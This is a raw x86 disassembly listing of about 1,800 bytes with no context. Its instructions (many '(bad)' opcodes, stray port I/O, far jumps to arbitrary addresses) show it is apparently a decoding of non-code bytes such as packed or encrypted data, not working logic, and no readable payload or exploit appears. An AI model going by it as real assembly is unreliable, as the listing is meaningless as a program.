  41b2f5:	or     DWORD PTR [ebx+0xa7bbf65],esp
  41b2fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2fc:	adc    al,0xbb
  41b2fe:	adc    dh,BYTE PTR [ebx+eax*4]
  41b301:	mov    bh,0x61
  41b303:	sbb    al,0xb7
  41b305:	mov    ah,BYTE PTR [ebp+0x17063b69]
  41b30b:	out    dx,eax
  41b30c:	push   esp
  41b30d:	js     0x41b32b
  41b30f:	mov    ds,WORD PTR [edx+0x27]
  41b312:	inc    esp
  41b313:	mov    esp,0x188804ce
  41b318:	dec    ebx
  41b319:	inc    ebp
  41b31a:	and    BYTE PTR [eax+0x6f],bh
  41b31d:	adc    al,0xfc
  41b31f:	inc    ecx
  41b320:	jp     0x41b35b
  41b322:	push   edi
  41b323:	(bad)  
  41b324:	ins    BYTE PTR es:[edi],dx
  41b325:	mov    bl,0xaa
  41b327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b328:	out    0x5,eax
  41b32a:	stos   DWORD PTR es:[edi],eax
  41b32b:	jae    0x41b334
  41b32d:	loopne 0x41b346
  41b32f:	inc    eax
  41b330:	(bad)  
  41b331:	cdq    
  41b332:	fadd   DWORD PTR [ecx+ecx*1]
  41b335:	xlat   BYTE PTR ds:[ebx]
  41b336:	sub    eax,0xf0280870
  41b33b:	or     dl,BYTE PTR [eax+0x2c]
  41b33e:	adc    al,BYTE PTR [esi]
  41b340:	(bad)  
  41b341:	cmp    eax,0xc068d1a0
  41b346:	add    DWORD PTR [ebx-0x11],ecx
  41b349:	sub    al,0xdb
  41b34b:	pop    edi
  41b34c:	call   0xb8eee02f
  41b351:	xor    eax,0x49a67e16
  41b356:	loopne 0x41b300
  41b358:	neg    DWORD PTR [edx]
  41b35a:	pop    ebx
  41b35b:	jns    0x41b358
  41b35d:	fcom   st(5)
  41b35f:	cmp    ah,BYTE PTR [ebx]
  41b361:	daa    
  41b362:	dec    DWORD PTR [edi+0x22]
  41b365:	stos   DWORD PTR es:[edi],eax
  41b366:	sbb    al,0xc3
  41b368:	fadd   QWORD PTR [ebx]
  41b36a:	push   ds
  41b36b:	retf   
  41b36c:	pop    ecx
  41b36d:	jne    0x41b30b
  41b36f:	jns    0x41b39f
  41b371:	jns    0x41b3b0
  41b373:	popa   
  41b374:	mov    ecx,0x24ba4962
  41b379:	jl     0x41b3d6
  41b37b:	in     al,dx
  41b37c:	in     al,0x1a
  41b37e:	push   eax
  41b37f:	ret    
  41b380:	data16 into 
  41b382:	jae    0x41b35b
  41b384:	cld    
  41b385:	and    esi,esp
  41b387:	(bad)  
  41b388:	sahf   
  41b389:	popa   
  41b38a:	push   ebp
  41b38b:	push   es
  41b38c:	sbb    BYTE PTR [ecx],0xd2
  41b38f:	ja     0x41b3bd
  41b391:	or     DWORD PTR [ecx],esi
  41b393:	jb     0x41b388
  41b395:	or     DWORD PTR [ecx-0x4d],edi
  41b398:	rcl    BYTE PTR [edi-0x79a63e13],cl
  41b39e:	dec    edx
  41b39f:	daa    
  41b3a0:	test   ax,0x41a0
  41b3a4:	scas   al,BYTE PTR es:[edi]
  41b3a5:	stos   DWORD PTR es:[edi],eax
  41b3a6:	mov    dl,0xf5
  41b3a8:	fiadd  WORD PTR [ebp-0x3d]
  41b3ab:	cld    
  41b3ac:	inc    eax
  41b3ad:	add    DWORD PTR [ecx-0x48],ebx
  41b3b0:	std    
  41b3b1:	fldenv [edx]
  41b3b3:	xor    eax,0x3063d9de
  41b3b8:	xchg   DWORD PTR [ecx+0x36],ecx
  41b3bb:	shr    ecx,cl
  41b3bd:	loopne 0x41b3ed
  41b3bf:	(bad)  
  41b3c0:	xchg   ebx,eax
  41b3c1:	mov    bh,0x7f
  41b3c3:	std    
  41b3c4:	and    al,0xb6
  41b3c6:	xor    al,0xb2
  41b3c8:	aam    0xde
  41b3ca:	adc    eax,0xf41e724b
  41b3cf:	pusha  
  41b3d0:	or     al,0x32
  41b3d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3d3:	loop   0x41b449
  41b3d5:	and    DWORD PTR ss:[edi],ecx
  41b3d8:	ins    BYTE PTR es:[edi],dx
  41b3d9:	xchg   DWORD PTR [eax+0x33],esp
  41b3dc:	aas    
  41b3dd:	iret   
  41b3de:	push   es
  41b3df:	sti    
  41b3e0:	xchg   esi,eax
  41b3e1:	sub    dh,0x7e
  41b3e4:	pop    esp
  41b3e5:	cmp    DWORD PTR [ebx+0x43],0xae4405ce
  41b3ec:	sub    eax,0x1bbf45bb
  41b3f1:	push   edx
  41b3f2:	xchg   ebp,eax
  41b3f3:	cmp    eax,0x6a7a420f
  41b3f8:	mov    ecx,0x238ab9d3
  41b3fd:	pop    ebx
  41b3fe:	pop    edx
  41b3ff:	fldcw  WORD PTR [ebx+0x537bcfbd]
  41b405:	jae    0x41b3bd
  41b407:	add    BYTE PTR [ecx],dl
  41b409:	cmp    DWORD PTR [edx-0x6b],ecx
  41b40c:	push   0x53
  41b40e:	icebp  
  41b40f:	scas   al,BYTE PTR es:[edi]
  41b410:	enter  0x68aa,0x43
  41b414:	cmp    al,0x83
  41b416:	dec    edi
  41b417:	test   al,0x14
  41b419:	inc    ecx
  41b41a:	pop    ecx
  41b41b:	add    eax,0xa8f12893
  41b420:	pop    esp
  41b421:	sar    bl,cl
  41b423:	ficomp DWORD PTR [ecx-0x745827cb]
  41b429:	jg     0x41b3e3
  41b42b:	pop    ecx
  41b42c:	sub    cl,bl
  41b42e:	dec    ebx
  41b42f:	jg     0x41b3fd
  41b431:	sbb    DWORD PTR [edx+0x3],ecx
  41b434:	cmp    edi,0x59
  41b437:	aaa    
  41b438:	xchg   esp,eax
  41b439:	pop    ebp
  41b43a:	aam    0x60
  41b43c:	jl     0x41b426
  41b43e:	push   esi
  41b43f:	outs   dx,DWORD PTR ds:[esi]
  41b440:	stos   BYTE PTR es:[edi],al
  41b441:	int    0xbb
  41b443:	jo     0x41b4ac
  41b445:	push   esi
  41b446:	call   0xf082:0xb802ccc9
  41b44d:	inc    edi
  41b44e:	int    0xdc
  41b450:	xchg   edx,eax
  41b451:	(bad)  
  41b452:	mov    ecx,0x579f8868
  41b457:	fs out dx,eax
  41b459:	cld    
  41b45a:	call   0xf3c3c4b8
  41b45f:	mov    ecx,0xd30f5b6c
  41b464:	push   es
  41b465:	rcl    BYTE PTR [edx+edi*2-0x2d],0xef
  41b46a:	mov    DWORD PTR [esi+0x2ecd113b],esi
  41b470:	(bad)  
  41b471:	in     eax,dx
  41b472:	fidiv  DWORD PTR [edi+0xb]
  41b475:	xchg   edi,eax
  41b476:	int3   
  41b477:	aad    0xa1
  41b479:	mov    ebp,0xf00a586f
  41b47e:	and    ebx,esp
  41b480:	mov    bh,0xbe
  41b482:	stos   DWORD PTR es:[edi],eax
  41b483:	mov    ebp,0xeb65916a
  41b488:	repnz mov ch,0xf0
  41b48b:	xchg   edx,eax
  41b48c:	xadd   DWORD PTR [ebx-0x2f61ddf],ebp
  41b493:	inc    edi
  41b494:	push   es
  41b495:	xchg   edi,eax
  41b496:	js     0x41b4d1
  41b498:	cwde   
  41b499:	out    dx,eax
  41b49a:	clc    
  41b49b:	lods   al,BYTE PTR ds:[esi]
  41b49c:	cs popa 
  41b49e:	nop
  41b49f:	xchg   ecx,eax
  41b4a0:	(bad)  
  41b4a2:	jge    0x41b444
  41b4a4:	mov    cs,WORD PTR [edx]
  41b4a6:	int    0x3d
  41b4a8:	cwde   
  41b4a9:	push   eax
  41b4aa:	iret   
  41b4ab:	neg    DWORD PTR [ebx-0x28]
  41b4ae:	add    eax,0xab36ee00
  41b4b3:	(bad)  
  41b4b4:	(bad)  
  41b4b5:	pop    edi
  41b4b6:	hlt    
  41b4b7:	mov    esi,DWORD PTR [ebx+ebx*1-0x44]
  41b4bb:	jmp    edi
  41b4bd:	sbb    BYTE PTR [eax+eax*4],bl
  41b4c0:	fimul  WORD PTR [ecx+edi*4-0x66]
  41b4c4:	(bad)  
  41b4c5:	jmp    0x41b530
  41b4c7:	mov    edi,0xf1a6d887
  41b4cc:	add    ah,BYTE PTR [ecx]
  41b4ce:	xchg   edi,eax
  41b4cf:	repz daa 
  41b4d1:	and    eax,0x20e168c3
  41b4d6:	sahf   
  41b4d7:	js     0x90f4f2c1
  41b4dd:	xchg   edi,eax
  41b4de:	xor    BYTE PTR [ebx+ecx*2-0x27],ah
  41b4e2:	push   ecx
  41b4e3:	pusha  
  41b4e4:	int3   
  41b4e5:	push   ebx
  41b4e6:	fmul   DWORD PTR [ecx*1+0x747cda41]
  41b4ed:	fbld   TBYTE PTR [edi*1-0x735ddc6f]
  41b4f4:	js     0x41b4c4
  41b4f6:	ja     0x41b536
  41b4f8:	cwde   
  41b4f9:	adc    eax,0x17fc3261
  41b4fe:	sbb    BYTE PTR [esi+0x0],0x18
  41b502:	enter  0x6099,0xc9
  41b506:	fld    DWORD PTR [esi-0x103e5211]
  41b50c:	lods   al,BYTE PTR ds:[esi]
  41b50d:	mov    esi,ds
  41b50f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b510:	and    al,dl
  41b512:	mov    edx,DWORD PTR [ecx-0x42a94779]
  41b518:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b519:	mov    cl,0xc2
  41b51b:	in     eax,dx
  41b51c:	dec    edx
  41b51d:	inc    DWORD PTR [esi-0x11900665]
  41b523:	mov    ebx,0x2190c376
  41b528:	mov    al,0x16
  41b52b:	loope  0x41b5aa
  41b52d:	add    eax,0x53a2cfda
  41b532:	mov    ds:0x27f445e9,al
  41b537:	pushf  
  41b538:	push   es
  41b539:	push   eax
  41b53a:	xchg   edx,eax
  41b53b:	aas    
  41b53c:	or     ecx,ecx
  41b53e:	in     al,dx
  41b53f:	sub    ah,BYTE PTR ds:0x5c0341ce
  41b545:	or     BYTE PTR [eax-0x1b3de01f],0xb
  41b54c:	ins    DWORD PTR es:[edi],dx
  41b54d:	es into 
  41b54f:	aas    
  41b550:	mov    eax,ds:0xa4e3d407
  41b555:	jbe    0x41b54b
  41b557:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41b559:	retf   
  41b55a:	stos   DWORD PTR es:[edi],eax
  41b55b:	nop
  41b55c:	adc    al,0x3a
  41b55e:	cmp    BYTE PTR [esi-0x2a],0xc6
  41b562:	ins    BYTE PTR es:[edi],dx
  41b563:	fs ss push esp
  41b566:	jmp    0x793b:0xf9d937ae
  41b56d:	scas   al,BYTE PTR es:[edi]
  41b56e:	es pop es
  41b570:	cmp    eax,0x65dc4b4f
  41b575:	mov    WORD PTR [edx],es
  41b577:	lods   al,BYTE PTR ds:[esi]
  41b578:	aas    
  41b579:	bound  eax,QWORD PTR [ecx+0x721e7c5e]
  41b57f:	out    dx,eax
  41b580:	cs mov esi,0x323dc472
  41b586:	enter  0x20d,0x99
  41b58a:	sbb    esp,edi
  41b58c:	xchg   ecx,eax
  41b58d:	ret    
  41b58e:	call   0x4204:0x454dcb45
  41b595:	das    
  41b596:	ret    
  41b597:	ins    BYTE PTR es:[edi],dx
  41b598:	into   
  41b599:	retf   0xf98d
  41b59c:	mov    DWORD PTR [ebx-0x61],edi
  41b59f:	aaa    
  41b5a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5a1:	adc    BYTE PTR [edx+0x2a],bl
  41b5a4:	pop    es
  41b5a5:	pop    edx
  41b5a6:	pop    ds
  41b5a7:	mov    WORD PTR [esi+eax*1],ss
  41b5aa:	xchg   ebp,eax
  41b5ab:	je     0x41b566
  41b5ad:	in     eax,dx
  41b5ae:	sbb    BYTE PTR [ecx-0x2c],0x3d
  41b5b2:	sub    eax,0xed4f15a2
  41b5b7:	xor    ah,dl
  41b5b9:	xor    eax,0xf8065385
  41b5be:	mov    ds:0x9910e3af,al
  41b5c3:	sub    al,0xdc
  41b5c5:	pop    ebp
  41b5c6:	push   ss
  41b5c7:	loop   0x41b571
  41b5c9:	inc    esi
  41b5ca:	cmp    BYTE PTR [esi],al
  41b5cc:	mov    ecx,0xedf9f392
  41b5d1:	mov    esi,0xc930ac9b
  41b5d6:	or     esp,DWORD PTR [edi]
  41b5d8:	xor    BYTE PTR cs:[eax+ebx*2],0x2f
  41b5dd:	ror    DWORD PTR [ebx-0x1725688c],0x27
  41b5e4:	push   edx
  41b5e5:	popf   
  41b5e6:	and    BYTE PTR [ecx],ch
  41b5e8:	xchg   ebp,eax
  41b5e9:	sub    eax,0x9b8e6ccd
  41b5ee:	ja     0x41b578
  41b5f0:	pop    ds
  41b5f1:	(bad)  
  41b5f2:	out    dx,al
  41b5f3:	into   
  41b5f4:	adc    DWORD PTR [esi],ebx
  41b5f6:	iret   
  41b5f7:	test   al,0x55
  41b5f9:	imul   esp,DWORD PTR [edi+eax*2],0x84433610
  41b600:	xchg   DWORD PTR [ebp+eiz*2+0x4f],edx
  41b604:	ins    BYTE PTR es:[edi],dx
  41b605:	popf   
  41b606:	mov    cl,0xb2
  41b608:	or     cl,BYTE PTR [ebx+ebp*1]
  41b60b:	jae    0x41b58e
  41b60d:	jp     0x41b5ea
  41b60f:	jns    0x41b680
  41b611:	loope  0x41b5ed
  41b613:	mov    eax,ds:0x77f0477d
  41b618:	repnz aas 
  41b61a:	sub    edx,DWORD PTR [ebx+0x10]
  41b61d:	inc    eax
  41b61e:	inc    ebx
  41b61f:	add    DWORD PTR [esi-0x3b],0xffffff96
  41b623:	and    DWORD PTR [eax+0x5dcad70a],ecx
  41b629:	retf   
  41b62a:	mov    eax,0x4c40842e
  41b62f:	cmp    esp,DWORD PTR [edi+0x77]
  41b632:	push   edi
  41b633:	pop    ds
  41b634:	and    eax,0x771fa595
  41b639:	jno    0x41b6ac
  41b63b:	cwde   
  41b63c:	sub    dh,BYTE PTR [ebx]
  41b63e:	jnp    0x41b5c3
  41b640:	in     eax,0x61
  41b642:	loopne 0x41b5e0
  41b644:	xor    ebp,DWORD PTR ds:0xf4ea2c1
  41b64a:	imul   edx,DWORD PTR [eax],0xdcca8fe0
  41b650:	pop    esi
  41b651:	add    al,0x80
  41b653:	xchg   DWORD PTR [edi],edi
  41b655:	std    
  41b656:	push   esp
  41b657:	push   cs
  41b658:	jnp    0x41b6c1
  41b65a:	inc    edi
  41b65b:	mov    al,0x54
  41b65d:	iret   
  41b65e:	xchg   esp,eax
  41b65f:	stos   BYTE PTR es:[edi],al
  41b660:	inc    edi
  41b661:	sbb    al,0x8a
  41b663:	lods   al,BYTE PTR ds:[esi]
  41b664:	jle    0x41b6a7
  41b666:	cs pause 
  41b669:	push   ebx
  41b66a:	iret   
  41b66b:	repz push es
  41b66d:	(bad)  
  41b66e:	push   0xe9b214f4
  41b673:	icebp  
  41b674:	sbb    DWORD PTR [ecx-0x2a591754],ebp
  41b67a:	lock pusha 
  41b67c:	adc    BYTE PTR [eax+0x71fbd077],dl
  41b682:	jmp    0x2b8ca992
  41b687:	add    eax,0x2804380a
  41b68c:	mov    dl,0x9b
  41b68e:	mov    gs,WORD PTR [edi+eiz*1-0x853a79f]
  41b695:	mov    cs,WORD PTR [esi+0x41]
  41b698:	add    bh,bh
  41b69a:	sbb    DWORD PTR [edi+0x12b64f0d],edi
  41b6a0:	jecxz  0x41b626
  41b6a2:	push   edi
  41b6a3:	scas   eax,DWORD PTR es:[edi]
  41b6a4:	stos   BYTE PTR es:[edi],al
  41b6a5:	sbb    BYTE PTR [edi],0x8a
  41b6a8:	dec    esi
  41b6a9:	popa   
  41b6aa:	push   esp
  41b6ab:	push   es
  41b6ac:	stos   BYTE PTR es:[edi],al
  41b6ad:	mul    DWORD PTR [ebx]
  41b6af:	or     eax,0xf7562def
  41b6b4:	loop   0x41b6f7
  41b6b6:	mov    ds:0x7d881b6e,al
  41b6bb:	sbb    BYTE PTR [eax+0x7b50171a],ch
  41b6c1:	fdivr  st,st(3)
  41b6c3:	xor    BYTE PTR [edx+0x42],al
  41b6c6:	mov    DWORD PTR [ecx],edi
  41b6c8:	rcl    WORD PTR [eax],0xaf
  41b6cc:	mov    eax,DWORD PTR [ecx]
  41b6ce:	clc    
  41b6cf:	jno    0x41b6bf
  41b6d1:	jl     0x41b752
  41b6d3:	clc    
  41b6d4:	nop
  41b6d5:	cmp    eax,ebx
  41b6d7:	aaa    
  41b6d8:	and    esi,DWORD PTR [ecx+edi*2+0x25]
  41b6dc:	(bad)  
  41b6dd:	scas   al,BYTE PTR es:[edi]
  41b6de:	fist   DWORD PTR [edi]
  41b6e0:	push   esi
  41b6e1:	arpl   ax,bx
  41b6e3:	xchg   ecx,eax
  41b6e4:	jmp    0x3c2:0x4b83ac0b
  41b6eb:	or     esi,DWORD PTR [edi+edi*8+0xd4c6c79]
  41b6f2:	in     al,dx
  41b6f3:	int    0x1d
  41b6f5:	jb     0x41b744
  41b6f7:	pop    edx
  41b6f8:	(bad)  
  41b6f9:	cld    
  41b6fa:	test   ah,bl
  41b6fc:	mov    bl,0x20
  41b6fe:	jmp    0x41b726
  41b700:	imul   ebx,DWORD PTR [ecx-0x6d],0x6b80dc57
  41b707:	push   cs
  41b708:	xchg   ebp,eax
  41b709:	dec    ebx
  41b70a:	or     dh,BYTE PTR [ebx+0x7d1f2d4b]
  41b710:	cwde   
  41b711:	in     al,0x7f
  41b713:	dec    ecx
  41b714:	xlat   BYTE PTR ds:[ebx]
  41b715:	fidivr WORD PTR [ebx+0x25a8637]
  41b71b:	push   ebx
  41b71c:	xchg   DWORD PTR [edx-0x5d152e6b],esi
  41b722:	dec    ecx
  41b723:	mov    edi,0x41fb2315
  41b728:	xchg   esp,eax
  41b729:	dec    ebp
  41b72a:	cmp    eax,DWORD PTR [ecx-0x4c]
  41b72d:	in     eax,0xbe
  41b72f:	jb     0x41b77d
  41b731:	ret    0xce69
  41b734:	dec    ebx
  41b735:	(bad)  
  41b736:	in     eax,dx
  41b737:	mov    cl,0x72
  41b739:	aad    0xae
  41b73b:	cmp    edx,DWORD PTR [ebx]
  41b73d:	loope  0x41b778
  41b73f:	push   eax
  41b740:	test   BYTE PTR [edi],al
  41b742:	push   ds
  41b743:	inc    esp
  41b744:	gs jne 0x41b74c
  41b747:	aas    
  41b748:	mov    edx,0x4e889f5a
  41b74d:	clc    
  41b74e:	lahf   
  41b74f:	cdq    
  41b750:	mov    bl,0x31
  41b752:	lea    ecx,[ecx]
  41b754:	xchg   ecx,eax
  41b755:	mov    esp,0xe4f62af6
  41b75a:	sahf   
  41b75b:	in     eax,dx
  41b75c:	cmp    eax,0x20c68c7f
  41b761:	loop   0x41b72a
  41b763:	cmp    edx,DWORD PTR [esi-0x3f09a32]
  41b769:	loopne 0x41b72b
  41b76b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b76c:	cmp    eax,0xcc6cdf4f
  41b771:	jp     0x41b77f
  41b773:	mov    eax,0xb2f74dd1
  41b778:	idiv   DWORD PTR [ecx]
  41b77a:	xchg   BYTE PTR [ebp+0x52],ch
  41b77d:	pusha  
  41b77e:	mov    edx,0xaad67577
  41b783:	fdiv   DWORD PTR [eax]
  41b785:	mov    edx,0x5e3e28a0
  41b78a:	and    BYTE PTR [edx*4-0x1ef8f618],0x1e
  41b792:	sub    DWORD PTR [ebx-0x578f872e],eax
  41b798:	retf   0x2922
  41b79b:	and    eax,0xb93182a6
  41b7a0:	rcl    BYTE PTR [esi],cl
  41b7a2:	pop    edx
  41b7a3:	push   cs
  41b7a4:	jnp    0x41b76d
  41b7a6:	and    al,0x65
  41b7a8:	mov    dh,0x65
  41b7aa:	and    al,0xdb
  41b7ac:	neg    esi
  41b7ae:	sbb    eax,0xc8a44b1c
  41b7b3:	leave  
  41b7b4:	loopne 0x41b7a4
  41b7b6:	xchg   BYTE PTR [edx-0x80],bl
  41b7b9:	mov    cl,0xe2
  41b7bb:	mov    ds:0x7dfd2fcc,eax
  41b7c0:	xchg   edi,eax
  41b7c1:	mov    WORD PTR [edi-0x3ece782],?
  41b7c7:	mov    eax,0x30e9f7ba
  41b7cc:	and    ebp,esi
  41b7ce:	jno    0x41b833
  41b7d0:	cmp    al,0x6d
  41b7d2:	jl     0x41b7f7
  41b7d4:	mov    ds:0x6a1fad10,al
  41b7d9:	js     0x41b7d3
  41b7db:	or     dh,BYTE PTR [ecx]
  41b7dd:	xor    DWORD PTR [eax],eax
  41b7df:	or     DWORD PTR [esi+eiz*2],eax
  41b7e2:	pop    edx
  41b7e3:	xchg   ebp,eax
  41b7e4:	lock scas al,BYTE PTR es:[edi]
  41b7e6:	repnz xchg ebp,eax
  41b7e8:	rol    DWORD PTR [eax],cl
  41b7ea:	xchg   ecx,eax
  41b7eb:	loopne 0x41b80a
  41b7ed:	sub    dl,bl
  41b7ef:	psraw  mm4,mm2
  41b7f2:	jno    0x41b849
  41b7f4:	mov    ch,0x78
  41b7f6:	dec    eax
  41b7f7:	stos   BYTE PTR es:[edi],al
  41b7f8:	jmp    0x43d4:0x28e5744c
  41b7ff:	retf   
  41b800:	(bad)  
  41b801:	in     eax,dx
  41b802:	mov    ?,ecx
  41b804:	sbb    edi,ebx
  41b806:	neg    BYTE PTR [esi+0x2f20ea4e]
  41b80c:	mov    WORD PTR [ecx],ss
  41b80e:	cdq    
  41b80f:	pop    es
  41b810:	jg     0x41b830
  41b812:	ins    BYTE PTR es:[edi],dx
  41b813:	mov    cl,0xe4
  41b815:	imul   esp,DWORD PTR [ebp-0x12230e7f],0xc8422008
  41b81f:	add    al,BYTE PTR [ebp-0x3e0387e9]
  41b825:	pop    DWORD PTR [edx-0xed5f768]
  41b82b:	pop    ss
  41b82c:	push   esi
  41b82d:	mov    esp,DWORD PTR [eax]
  41b82f:	and    al,0xdc
  41b831:	pop    esi
  41b832:	cmp    BYTE PTR [esi+0x2a],dl
  41b835:	mov    al,dh
  41b837:	dec    eax
  41b838:	mov    dh,0x4
  41b83a:	mov    esp,0x23ff35f2
  41b83f:	push   ebx
  41b840:	pop    eax
  41b841:	xor    eax,0x9e9f9b5b
  41b846:	mov    WORD PTR [ebx+0x1477094a],?
  41b84c:	push   ss
  41b84d:	les    edx,FWORD PTR [ecx+ecx*8]
  41b850:	fld    DWORD PTR [edx-0x31]
  41b853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b854:	sub    DWORD PTR [eax],edi
  41b856:	ja     0x41b83a
  41b858:	aaa    
  41b859:	loopne 0x41b828
  41b85b:	cli    
  41b85c:	fcomp  DWORD PTR [ebx+0x2df1b80e]
  41b862:	ds and eax,0xa836553a
  41b868:	ins    DWORD PTR es:[edi],dx
  41b869:	and    eax,DWORD PTR [edx]
  41b86b:	xchg   ebp,eax
  41b86c:	mov    al,ds:0x79a135a0
  41b871:	mov    BYTE PTR [eax],0x29
  41b874:	pop    es
  41b875:	xlat   BYTE PTR ds:[ebx]
  41b876:	mov    ss,WORD PTR [ebx+0x48d394b0]
  41b87c:	mov    dl,cl
  41b87e:	or     DWORD PTR [ebx+0x2892af83],0x29b3aabc
  41b888:	mov    ebp,0xa5b825a0
  41b88d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b88e:	ss (bad) 
  41b890:	mov    dl,0x3a
  41b892:	fwait
  41b893:	pop    esi
  41b894:	jns    0x41b858
  41b896:	and    DWORD PTR [ebx+0x58],ebp
  41b899:	jb     0x41b8c4
  41b89b:	rcr    DWORD PTR [edi+0x56d26ff6],0xdc
  41b8a2:	sub    dl,dl
  41b8a4:	xchg   edi,eax
  41b8a5:	mov    bl,0xc6
  41b8a7:	and    al,0x5d
  41b8a9:	(bad)  
  41b8aa:	adc    bl,BYTE PTR [ebp+0x2e]
  41b8ad:	fmul   QWORD PTR [ebx+ecx*2]
  41b8b0:	xchg   edi,eax
  41b8b1:	leave  
  41b8b2:	dec    esi
  41b8b3:	and    ch,dl
  41b8b5:	idiv   DWORD PTR [edx-0x3aec4877]
  41b8bb:	out    0xb7,al
  41b8bd:	int    0x73
  41b8bf:	fcmovne st,st(3)
  41b8c1:	mov    WORD PTR ds:[edx+0x50],?
  41b8c5:	mov    ecx,0x6b2aea73
  41b8ca:	xchg   cl,bl
  41b8cc:	xor    cl,BYTE PTR [ebx-0x6576bf16]
  41b8d2:	add    BYTE PTR [eax],al
  41b8d4:	mov    edx,0xded86777
  41b8d9:	xchg   ch,al
  41b8db:	mov    edx,0x642e4d67
  41b8e0:	lods   al,BYTE PTR ds:[esi]
  41b8e1:	push   ebp
  41b8e2:	call   0x942eef2d
  41b8e7:	lahf   
  41b8e8:	jl     0x41b8d8
  41b8ea:	jnp    0x41b922
  41b8ec:	ss push 0xe72ab0f4
  41b8f2:	xchg   DWORD PTR [edx-0x7ff950e],edx
  41b8f8:	ins    DWORD PTR es:[edi],dx
  41b8f9:	fld    DWORD PTR [edx]
  41b8fb:	sub    al,0x61
  41b8fd:	test   ebp,esi
  41b8ff:	dec    ecx
  41b900:	dec    ebx
  41b901:	mov    bl,0xd6
  41b903:	mov    ds:0xd1de4626,al
  41b908:	add    DWORD PTR [edx],edi
  41b90a:	outs   dx,DWORD PTR cs:[esi]
  41b90c:	mov    ch,0x15
  41b90e:	pusha  
  41b90f:	add    dl,al
  41b911:	pop    edx
  41b912:	mov    ds:0xd3b2f99b,al
  41b917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b918:	mov    eax,ds:0xa1857565
  41b91d:	dec    eax
  41b91e:	and    BYTE PTR [edi+0x54c7163c],dh
  41b924:	fst    DWORD PTR [ebx]
  41b926:	ror    DWORD PTR [ecx],0x4a
  41b929:	call   0xbd475bc1
  41b92e:	jge    0x41b943
  41b930:	sahf   
  41b931:	sbb    al,BYTE PTR [eax+0x3e]
  41b934:	pop    ss
  41b935:	dec    ebp
  41b936:	jecxz  0x41b985
  41b938:	mov    bl,0xa8
  41b93a:	mov    ch,0xa6
  41b93c:	mov    edx,0x5587710c
  41b941:	test   DWORD PTR [edx],ebx
  41b943:	sti    
  41b944:	mov    ?,WORD PTR [edi]
  41b946:	pop    ds
  41b947:	in     eax,dx
  41b948:	jecxz  0x41b932
  41b94a:	mov    bl,0x37
  41b94c:	push   es
  41b94d:	pop    ebx
  41b94e:	dec    eax
  41b94f:	or     esp,DWORD PTR [ecx]
  41b951:	fdiv   QWORD PTR [eax+ebx*8]
  41b954:	outs   dx,DWORD PTR ds:[esi]
  41b955:	fldenv [edi-0x6f86a9e0]
  41b95b:	push   0x214f4557
  41b960:	inc    ecx
  41b961:	add    DWORD PTR [edi],esp
  41b963:	mov    al,0xd0
  41b965:	mov    ah,0x26
  41b967:	out    0x7d,eax
  41b969:	mov    esi,0x86e3baf1
  41b96e:	into   
  41b96f:	(bad)  
  41b970:	aaa    
  41b971:	or     eax,0xf65e6b7a
  41b976:	jl     0x41b9dd
  41b978:	push   0x23
  41b97a:	test   ch,dl
  41b97c:	add    DWORD PTR [edx-0x22],0x96726b2d
  41b983:	add    edi,DWORD PTR [esi-0x5e4baac1]
  41b989:	add    eax,0xd869ea36
  41b98e:	sub    eax,0xca05439b
  41b993:	mov    ch,0x43
  41b995:	mov    es,WORD PTR [esi+0xf30ac3]
  41b99b:	sbb    al,0x70
  41b99d:	xlat   BYTE PTR ds:[ebx]
  41b99e:	fcomp  QWORD PTR [edx]
  41b9a0:	scas   al,BYTE PTR es:[edi]
  41b9a1:	push   0x67
  41b9a3:	js     0x41ba0d
  41b9a5:	ror    DWORD PTR [esi],cl
  41b9a7:	aaa    
  41b9a8:	xor    BYTE PTR [eax+0x4a],dh
  41b9ab:	iret   
  41b9ac:	jl     0x41b9cb
  41b9ae:	xchg   DWORD PTR [esp+ebx*4+0x2f],ecx
  41b9b2:	xor    esi,esp
  41b9b4:	in     eax,dx
  41b9b5:	mov    eax,0x27ae6e71
  41b9ba:	jecxz  0x41b989
  41b9bc:	add    ebx,DWORD PTR [ecx-0x29]
  41b9bf:	es fcomp st(4)
  41b9c2:	pslld  mm0,mm3
  41b9c5:	add    eax,0x6c478bf4
  41b9ca:	xor    ecx,esp
  41b9cc:	enter  0x84f0,0x18
  41b9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9d1:	pop    edx
  41b9d2:	or     BYTE PTR [edi],0x44
  41b9d5:	pop    edi
  41b9d6:	std    
  41b9d7:	in     eax,0x50
  41b9d9:	jb     0x41b9ce
  41b9db:	test   al,0x84
  41b9dd:	fidivr DWORD PTR [esi+0x762654cb]
  41b9e3:	jecxz  0x41b9df
  41b9e5:	iret   
  41b9e6:	call   FWORD PTR [edx-0x371bbc8]
  41b9ec:	and    al,BYTE PTR [bp+si+0x3]
  41b9f0:	adc    DWORD PTR [ebp+0x15dfd171],edi
  41b9f6:	add    eax,DWORD PTR [ebx+0x47]
  41b9f9:	xlat   BYTE PTR ds:[ebx]
  41b9fa:	add    esp,esp
  41b9fc:	mov    esp,0x67b5a016
  41ba01:	pop    eax
  41ba02:	fadd   DWORD PTR [esi]
  41ba04:	push   ebp
  41ba05:	or     al,0x8e
  41ba07:	(bad)  
  41ba08:	fmul   QWORD PTR ds:0xd8149b9e
  41ba0e:	std    
  41ba0f:	sbb    DWORD PTR [ecx-0x12],0xffffffe0
  41ba13:	mov    cl,0x69
  41ba15:	cmp    DWORD PTR [ecx+ecx*8+0x47],esi
  41ba19:	sub    eax,0x27c17620
  41ba1e:	mov    ebx,0x6f8cb77c
  41ba23:	jns    0x41ba25
  41ba25:	imul   ecx,DWORD PTR [edx-0x1c98977e],0xd413c622
  41ba2f:	mov    ds:0xc20c5b97,eax
  41ba34:	mov    bl,0xbf
  41ba36:	push   edx
  41ba37:	outs   dx,BYTE PTR ds:[esi]
  41ba38:	pop    edx
  41ba39:	inc    eax
  41ba3a:	dec    esp
